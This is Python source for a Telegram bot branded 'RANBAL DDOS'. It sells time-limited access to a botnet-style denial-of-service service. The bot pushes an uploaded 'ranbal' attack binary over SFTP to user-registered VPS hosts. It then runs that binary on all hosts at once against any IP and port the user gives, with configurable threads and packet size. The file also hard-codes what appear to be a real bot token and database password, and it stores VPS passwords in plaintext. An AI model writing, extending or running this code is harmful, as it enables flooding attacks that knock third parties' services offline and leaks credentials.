import logging
import asyncio
from pymongo import MongoClient
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackContext, MessageHandler, filters, CallbackQueryHandler
import asyncssh
from telegram.helpers import escape_markdown
from bson import Binary
import time

# Configure logging
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger(__name__)

TELEGRAM_BOT_TOKEN = '7431527955:AAH735I65NnKPqpqK7--ZFCQay3BzgsPSL0' # Replace with your bot token
MONGO_URI = "mongodb+srv://rmr31098:rajput1@cluster0.ikby5.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0"  # Replace with your MongoDB URI
DB_NAME = "TEST"
VPS_COLLECTION_NAME = "vps_list"
SETTINGS_COLLECTION_NAME = "settings"

client = MongoClient(MONGO_URI)
db = client[DB_NAME]
settings_collection = db[SETTINGS_COLLECTION_NAME]
vps_collection = db[VPS_COLLECTION_NAME]
APPROVED_USERS_COLLECTION_NAME = "approved_users"
approved_users_collection = db[APPROVED_USERS_COLLECTION_NAME]

ADMIN_USER_ID = 5759284972  # Replace with your admin user ID
last_attack_time = {}

async def add_user(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this command!*", parse_mode='Markdown')
        return

    if len(context.args) != 2:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /add_user <user_id> <hours/days>*", parse_mode='Markdown')
        return

    new_user_id = int(context.args[0])
    duration = context.args[1]

    # Determine the expiration time
    if duration.endswith('h'):
        hours = int(duration[:-1])
        expiration_time = time.time() + hours * 3600
    elif duration.endswith('d'):
        days = int(duration[:-1])
        expiration_time = time.time() + days * 86400
    else:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Invalid duration format! Use 'h' for hours or 'd' for days.*", parse_mode='Markdown')
        return

    approved_users_collection.update_one(
        {"user_id": new_user_id},
        {"$set": {"user_id": new_user_id, "expiration_time": expiration_time}},
        upsert=True
    )
    await context.bot.send_message(chat_id=chat_id, text=f"*✅ User {new_user_id} added to approved list for {duration}!*", parse_mode='Markdown')

# Function to remove a user from the approved list
async def remove_user(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this command!*", parse_mode='Markdown')
        return

    if len(context.args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /remove_user <user_id>*", parse_mode='Markdown')
        return

    user_id_to_remove = int(context.args[0])
    result = approved_users_collection.delete_one({"user_id": user_id_to_remove})

    if result.deleted_count > 0:
        await context.bot.send_message(chat_id=chat_id, text=f"*✅ User {user_id_to_remove} removed from approved list!*", parse_mode='Markdown')
    else:
        await context.bot.send_message(chat_id=chat_id, text=f"*❌ User {user_id_to_remove} not found in approved list!*", parse_mode='Markdown')

# Function to list all approved users
async def list_users(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this command!*", parse_mode='Markdown')
        return

    users = approved_users_collection.find()
    user_list = "\n".join([str(user["user_id"]) for user in users])

    if user_list:
        await context.bot.send_message(chat_id=chat_id, text=f"*✅ Approved Users:*\n{user_list}", parse_mode='Markdown')
    else:
        await context.bot.send_message(chat_id=chat_id, text="*❌ No approved users found!*", parse_mode='Markdown')

async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if not approved_users_collection.find_one({"user_id": user_id}):
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this command!*", parse_mode='Markdown')
        return

    user_keyboard = [
        [
            InlineKeyboardButton("🔧 ADD VPS", callback_data="configure_vps"),
            InlineKeyboardButton("🔧 SETUP VPS", callback_data="setup"),
        ],
        [
            InlineKeyboardButton("🚀 START ATTACK", callback_data="start_attack"),
            InlineKeyboardButton("🚀 VPS STATUS", callback_data="vps_status"),
        ]
    ]
    admin_keyboard = [
        [
            InlineKeyboardButton("🔧 ADD VPS", callback_data="configure_vps"),
            InlineKeyboardButton("🔧 SETUP VPS", callback_data="setup"),
        ],
        [
            InlineKeyboardButton("🚀 START ATTACK", callback_data="start_attack"),
            InlineKeyboardButton("🚀 VPS STATUS", callback_data="vps_status"),
        ],
        [
            InlineKeyboardButton("⚙️ Show Settings", callback_data="show_settings"),
        ]
    ]

    keyboard = admin_keyboard if user_id == ADMIN_USER_ID else user_keyboard
    reply_markup = InlineKeyboardMarkup(keyboard)

    message = (
        "🔥 *Welcome to the RANBAL DDOS* 🔥\n\n"
        "⚔️ Prepare for war! Use the buttons below to begin."
    )

    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode="Markdown", reply_markup=reply_markup)

async def button_handler(update: Update, context: CallbackContext):
    query = update.callback_query
    await query.answer()

    if query.data == "show_settings":
        await show_settings(update, context)
    elif query.data == "start_attack":
        await context.bot.send_message(chat_id=query.message.chat_id, text="*⚠️ Use /attack <ip> <port> <duration>*", parse_mode="Markdown")
    elif query.data == "setup":
        await context.bot.send_message(chat_id=query.message.chat_id, text="*ℹ️ Use /setup commands to setup VPS for attack.*", parse_mode="Markdown")
    elif query.data == "configure_vps":
        await context.bot.send_message(chat_id=query.message.chat_id, text="*🔧 Use /add_vps to configure your VPS settings.*", parse_mode="Markdown")
    elif query.data == "vps_status":
        await context.bot.send_message(chat_id=query.message.chat_id, text="*🔧 Use /vps_status to see VPS.*", parse_mode="Markdown")

async def vps_status(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    # Fetch the user's VPS details
    vps_data = vps_collection.find_one({"user_id": user_id})

    if not vps_data or not vps_data.get("vps_list"):
        await context.bot.send_message(
            chat_id=chat_id,
            text="❌ *No VPS configured!*\nUse /add_vps to add your VPS details and get started.",
            parse_mode="Markdown",
        )
        return

    # Extract VPS details
    message = "🌐 *Your VPS List:*\n"
    for vps in vps_data["vps_list"]:
        message += f"🖥️ *IP Address:* `{vps['ip']}`\n👤 *Username:* `{vps['username']}`\n\n"

    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode="Markdown")

async def set_thread(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this command!*", parse_mode='Markdown')
        return

    if len(context.args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /thread <number>*", parse_mode='Markdown')
        return

    try:
        threads = int(context.args[0])
        settings_collection.update_one(
            {},
            {"$set": {"threads": threads}},
            upsert=True
        )
        await context.bot.send_message(chat_id=chat_id, text=f"*✅ Thread count set to {threads}!*", parse_mode='Markdown')
    except ValueError:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Please provide a valid number for threads!*", parse_mode='Markdown')

async def set_byte(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this command!*", parse_mode='Markdown')
        return

    if len(context.args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /byte <number>*", parse_mode='Markdown')
        return

    try:
        packet_size = int(context.args[0])
        settings_collection.update_one(
            {},
            {"$set": {"packet_size": packet_size}},
            upsert=True
        )
        await context.bot.send_message(chat_id=chat_id, text=f"*✅ Packet size set to {packet_size} bytes!*", parse_mode='Markdown')
    except ValueError:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Please provide a valid number for packet size!*", parse_mode='Markdown')

async def show_settings(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this command!*", parse_mode='Markdown')
        return
    
    settings = settings_collection.find_one()
    
    if not settings:
        await context.bot.send_message(chat_id=chat_id, text="*❌ Settings not found!*", parse_mode='Markdown')
        return
    
    threads = settings.get("threads", "Not set")
    packet_size = settings.get("packet_size", "Not set")
    
    message = (
        f"*⚙️ Current Settings:*\n"
        f"*Threads:* {threads}\n"
        f"*Packet Size:* {packet_size} bytes"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def add_vps(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    args = context.args
    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /add_vps <ip> <username> <password>*", parse_mode='Markdown')
        return

    ip, username, password = args

    existing_vps = vps_collection.find_one({"user_id": user_id})

    if existing_vps:
        vps_collection.update_one(
            {"user_id": user_id},
            {"$addToSet": {"vps_list": {"ip": ip, "username": username, "password": password}}}
        )
        message = "*♻️ New VPS added to your existing list!*"
    else:
        vps_collection.insert_one({
            "user_id": user_id,
            "vps_list": [{"ip": ip, "username": username, "password": password}]
        })
        message = "*✅ New VPS added successfully!*"

    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
    
async def remove_vps(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    args = context.args
    if len(args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /remove_vps <ip>*", parse_mode='Markdown')
        return

    ip_to_remove = args[0]

    existing_vps = vps_collection.find_one({"user_id": user_id})

    if existing_vps and "vps_list" in existing_vps:
        result = vps_collection.update_one(
            {"user_id": user_id},
            {"$pull": {"vps_list": {"ip": ip_to_remove}}}
        )

        if result.modified_count > 0:
            message = "*✅ VPS removed successfully!*"
        else:
            message = "*❌ VPS not found in your list!*"
    else:
        message = "*❌ No VPS configured!*"

    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def attack(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if not approved_users_collection.find_one({"user_id": user_id}):
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this command!*", parse_mode='Markdown')
        return
    
    current_time = time.time()
    
    args = context.args
    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /attack <ip> <port> <duration>*", parse_mode='Markdown')
        return

    target_ip, port, duration = args
    port = int(port)
    duration = int(duration)

    all_vps_data = vps_collection.find_one({"user_id": user_id})

    if not all_vps_data or not all_vps_data.get("vps_list"):
        await context.bot.send_message(chat_id=chat_id, text="*❌ No VPS configured. Use /add_vps to add one!*", parse_mode='Markdown')
        return

    await context.bot.send_message(
        chat_id=chat_id,
        text=(f"*⚔️ Attack Launched on all VPS! ⚔️*\n"
              f"*🎯 Target: {target_ip}:{port}*\n"
              f"*🕒 Duration: {duration} seconds*\n"
              f"*💥 Powered By RANBAL DDOS*"),
        parse_mode='Markdown'
    )

    settings = settings_collection.find_one() or {}
    threads = settings.get("threads", 800)  # Default to 900 threads
    packet_size = settings.get("packet_size", 6)  # Default to 6 bytes

    for vps_data in all_vps_data["vps_list"]:
        asyncio.create_task(run_ssh_attack(vps_data, target_ip, port, duration, threads, packet_size, chat_id, context))

    last_attack_time[user_id] = current_time

async def run_ssh_attack(vps_data, target_ip, port, duration, threads, packet_size, chat_id, context):
    try:
        async with asyncssh.connect(
            vps_data["ip"],
            username=vps_data["username"],
            password=vps_data["password"],
            known_hosts=None
        ) as conn:
            command = f"./ranbal {target_ip} {port} {duration} {packet_size} {threads}"
            result = await conn.run(command, check=True)

            await context.bot.send_message(
                chat_id=chat_id,
                text=f"*✅ Attack completed successfully on {vps_data['ip']}!*",
                parse_mode='Markdown'
            )
    except Exception as e:
        await context.bot.send_message(
            chat_id=chat_id,
            text=f"*❌ SSH Error on {vps_data['ip']}: {str(e)}*",
            parse_mode='Markdown'
        )

async def upload(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="❌ *You are not authorized to use this command!*", parse_mode="Markdown")
        return

    await context.bot.send_message(chat_id=chat_id, text="✅ *Send the ranbal binary now.*", parse_mode="Markdown")

async def handle_file_upload(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="❌ *You are not authorized to upload files!*", parse_mode="Markdown")
        return

    document = update.message.document
    if document.file_name != "ranbal":
        await context.bot.send_message(chat_id=chat_id, text="❌ *Please upload the correct file (ranbal binary).*", parse_mode="Markdown")
        return

    file = await context.bot.get_file(document.file_id)
    file_content = await file.download_as_bytearray()

    result = settings_collection.update_one(
        {"name": "binary_ranbal"},
        {"$set": {"binary": Binary(file_content)}},
    )

    if result.matched_count > 0:
        await context.bot.send_message(chat_id=chat_id, text="✅ *ranbal binary replaced successfully.*", parse_mode="Markdown")
    else:
        await context.bot.send_message(chat_id=chat_id, text="❌ *Failed to replace the binary. No matching document found.*", parse_mode="Markdown")

async def setup(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    vps_data = vps_collection.find_one({"user_id": user_id})

    if not vps_data or not vps_data.get("vps_list"):
        await context.bot.send_message(
            chat_id=chat_id,
            text=escape_markdown("❌ No VPS configured! Add your VPS details and get started."),
            parse_mode="Markdown",
        )
        return

    ranbal_binary_doc = settings_collection.find_one({"name": "binary_ranbal"})
    if not ranbal_binary_doc:
        await context.bot.send_message(
            chat_id=chat_id,
            text=escape_markdown("❌ No ranbal binary found! Admin must upload it first."),
            parse_mode="Markdown",
        )
        return

    ranbal_binary = ranbal_binary_doc["binary"]

    for vps in vps_data["vps_list"]:
        ip = vps.get("ip")
        username = vps.get("username")
        password = vps.get("password")

        try:
            async with asyncssh.connect(
                ip,
                username=username,
                password=password,
                known_hosts=None
            ) as conn:
                await context.bot.send_message(
                    chat_id=chat_id,
                    text=escape_markdown(f"🔄 Uploading ranbal binary to {ip}..."),
                    parse_mode="Markdown",
                )

                async with conn.start_sftp_client() as sftp:
                    async with sftp.open("ranbal", "wb") as remote_file:
                        await remote_file.write(ranbal_binary)

                await conn.run("chmod +x ranbal", check=True)

                await context.bot.send_message(
                    chat_id=chat_id,
                    text=escape_markdown(f"✅ ranbal binary uploaded and permissions set successfully on {ip}."),
                    parse_mode="Markdown",
                )

        except asyncssh.Error as e:
            await context.bot.send_message(
                chat_id=chat_id,
                text=escape_markdown(f"❌ SSH Error on {ip}: {str(e)}"),
                parse_mode="Markdown",
            )
        except Exception as e:
            await context.bot.send_message(
                chat_id=chat_id,
                text=escape_markdown(f"❌ Error on {ip}: {str(e)}"),
                parse_mode="Markdown",
            )

def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("thread", set_thread))
    application.add_handler(CommandHandler("byte", set_byte))
    application.add_handler(CommandHandler("show", show_settings))
    application.add_handler(CommandHandler("add_vps", add_vps))
    application.add_handler(CommandHandler("remove_vps", remove_vps))
    application.add_handler(CommandHandler("vps_status", vps_status))
    application.add_handler(CommandHandler("upload", upload))
    application.add_handler(CommandHandler("setup", setup))
    application.add_handler(CommandHandler("add_user", add_user))
    application.add_handler(CommandHandler("remove_user", remove_user))
    application.add_handler(CommandHandler("list_users", list_users))

    application.add_handler(MessageHandler(filters.Document.ALL, handle_file_upload))
    application.add_handler(CallbackQueryHandler(button_handler))
    application.run_polling()

if __name__ == '__main__':
    main()